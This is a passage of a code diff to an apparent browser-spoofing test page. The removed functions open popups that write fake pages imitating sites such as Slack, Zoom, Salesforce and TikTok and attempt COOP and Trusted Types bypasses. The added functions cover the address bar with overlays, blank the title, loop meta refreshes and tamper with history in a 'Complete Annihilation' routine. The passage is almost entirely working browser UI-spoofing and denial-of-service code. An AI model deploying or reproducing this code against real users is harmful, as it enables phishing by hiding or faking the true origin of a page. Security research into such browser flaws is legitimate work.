-        win.document.body.appendChild(visibilityScript);
-    };
-
-    // METHOD 17: Brave Tor Spoof
-    window.method17_braveTorSpoof = function() {
-        let win = window.open('', '_blank', 'private,tor');
-        if(win) {
-            win.document.write(generateEvilPage('https://www.brave.com', 'Brave Tor Window Spoof'));
-            setTimeout(() => {
-                try {
-                    win.location.replace('https://www.brave.com:8080');
-                } catch(e) {}
-            }, 100);
-        } else {
-            alert('Please enable Brave Tor window or allow popups');
-        }
-    };
-
-    // METHOD 18: Firefox Container
-    window.method18_firefoxContainer = function() {
-        let win = window.open('https://www.mozilla.org:1234', '_blank', 'container=1');
-        if(win) {
-            setTimeout(() => {
-                win.document.write(generateEvilPage('https://www.mozilla.org', 'Firefox Container Exploit'));
-            }, 100);
-        }
-    };
-
-    // METHOD 19: HTTP/2 Cancel
-    window.method19_http2Cancel = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.twitch.tv', 'HTTP/2 Stream Cancel'));
-        
-        // Attempt to cancel fetch request
-        let controller = new AbortController();
-        fetch('https://www.twitch.tv', {signal: controller.signal}).catch(() => {});
-        controller.abort();
-        
-        setTimeout(() => {
-            try {
-                win.location.replace('https://www.twitch.tv:1234');
-            } catch(e) {}
-        }, 10);
-    };
-
-    // METHOD 20: COOP Bypass
-    window.method20_coopBypass = function() {
-        let win = window.open('', '_blank', 'noopener=false');
-        win.document.write(generateEvilPage('https://www.slack.com', 'COOP Bypass Attack'));
-        
-        // Maintain opener reference
-        if(win.opener) {
-            win.opener.postMessage({type: 'spoof', url: 'https://www.slack.com:1234'}, '*');
-        }
-    };
-
-    // METHOD 21: WebBundle Spoof
-    window.method21_webbundleSpoof = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        let bundleHTML = `<!DOCTYPE html>
+    // EXPERIMENT 20: Meta Refresh Loop
+    window.exp20_metaRefreshLoop = function() {
+        let metaHTML = `<!DOCTYPE html>
         <html>
         <head>
-            <link rel="webbundle" href="data:application/webbundle;base64,${btoa('fake bundle content')}">
+            <meta http-equiv="refresh" content="0">
+            <title>Meta Refresh Loop</title>
         </head>
         <body>
-            ${generateEvilPage('https://www.zoom.us', 'WebBundle Spoofing')}
+            ${generateBlankPage('Meta Refresh 0ms Infinite Loop')}
         </body>
         </html>`;
-        win.document.write(bundleHTML);
+        let win = window.open('', '_blank');
+        win.document.write(metaHTML);
     };
 
-    // METHOD 22: CSS Scroll Hide
-    window.method22_cssScrollHide = function() {
-        let scrollHTML = generateEvilPage('https://www.dropbox.com', 'CSS Scroll Snap Hide', `
-            <style>
-                html {
-                    scroll-snap-type: y mandatory;
-                    overscroll-behavior: contain;
-                }
-                .scroll-section {
-                    scroll-snap-align: start;
-                    height: 100vh;
-                }
-            </style>
-            <div class="scroll-section"></div>
-            <div class="scroll-section"></div>
-        `);
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(scrollHTML);
-    };
-
-    // METHOD 23: Trusted Types Bypass
-    window.method23_trustedTypesBypass = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        let ttHTML = generateEvilPage('https://www.salesforce.com', 'Trusted Types Bypass');
-        
-        let bypassScript = `
-            if(window.trustedTypes) {
-                const policy = trustedTypes.createPolicy('bypass', {
-                    createHTML: s => s
-                });
-                document.body.innerHTML = policy.createHTML(\`${ttHTML.replace(/`/g, '\\`')}\`);
+    // EXPERIMENT 21: CSS Overlay
+    window.exp21_cssOverlay = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('CSS UI Overlay - Visual Blank'));
+        let style = win.document.createElement('style');
+        style.textContent = `
+            .address-bar-cover {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 80px;
+                background: #0a0a2a;
+                z-index: 2147483647;
+                backdrop-filter: blur(20px);
+                pointer-events: none;
             }
         `;
-        
-        let script = win.document.createElement('script');
-        script.textContent = bypassScript;
-        win.document.write('<html><body></body></html>');
-        win.document.body.appendChild(script);
+        win.document.head.appendChild(style);
+        let cover = win.document.createElement('div');
+        cover.className = 'address-bar-cover';
+        win.document.body.appendChild(cover);
     };
 
-    // METHOD 24: Performance Timing Attack
-    window.method24_performanceTiming = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.adobe.com', 'Performance Timing Attack'));
-        
-        performance.mark('spoof-start');
-        
-        requestAnimationFrame(() => {
+    // EXPERIMENT 22: Open Close Race
+    window.exp22_openCloseRace = function() {
+        let w = window.open('', '_blank');
+        w.close();
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('Open-Close Race Condition'));
+    };
+
+    // EXPERIMENT 23: Title Overwrite
+    window.exp23_titleOverwrite = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('document.title = "" Overwrite'));
+        win.document.title = '';
+        // Override title continuously
+        setInterval(() => { win.document.title = ''; }, 10);
+    };
+
+    // EXPERIMENT 24: Arc Easel
+    window.exp24_arcEasel = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('Arc Easel Conflict Exploit'));
+        let canvas = win.document.createElement('canvas');
+        canvas.width = 10000;
+        canvas.height = 10000;
+        let ctx = canvas.getContext('2d');
+        for(let i = 0; i < 1000; i++) {
+            ctx.fillRect(i*10, i*10, 100, 100);
+        }
+        canvas.toBlob(() => {});
+    };
+
+    // EXPERIMENT 25: Complete Annihilation
+    window.exp25_completeAnnihilation = function() {
+        let win = window.open('null:about:blank', '_blank');
+        setTimeout(() => {
+            win.document.write(generateBlankPage('COMPLETE ANNIHILATION - All Techniques Combined'));
+            // Apply all techniques
             try {
-                win.location.replace('https://www.adobe.com:1234');
+                win.history.pushState({}, '', '\x00');
+                win.history.replaceState({}, '', '');
+                win.document.title = '';
+                win.stop();
+                // Intensive loop
+                setInterval(() => {
+                    for(let i=0; i<100000; i++) {}
+                    win.history.replaceState({}, '', '');
+                }, 10);
+                // CSS overlay
+                let style = win.document.createElement('style');
+                style.textContent = `
+                    body::before {
+                        content: '';
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        right: 0;
+                        height: 100px;
+                        background: #0a0a2a;
+                        z-index: 999999;
+                        backdrop-filter: blur(30px);
+                    }
+                `;
+                win.document.head.appendChild(style);
             } catch(e) {}
-            performance.measure('spoof-duration', 'spoof-start');
-        });
-    };
-
-    // METHOD 25: VirtualKeyboard Spoof
-    window.method25_virtualKeyboard = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        let vkHTML = generateEvilPage('https://www.tiktok.com', 'VirtualKeyboard API Spoof', `
-            <input type="text" id="focus-input" style="position:fixed;bottom:0;left:0;opacity:0;">
-            <script>
-                if(navigator.virtualKeyboard) {
-                    navigator.virtualKeyboard.overlayContent = true;
-                    document.getElementById('focus-input').focus();
-                    navigator.virtualKeyboard.show();
-                }
-            <\/script>
-        `);
-        win.document.write(vkHTML);
+        }, 200);
     };
 </script>
 </body>
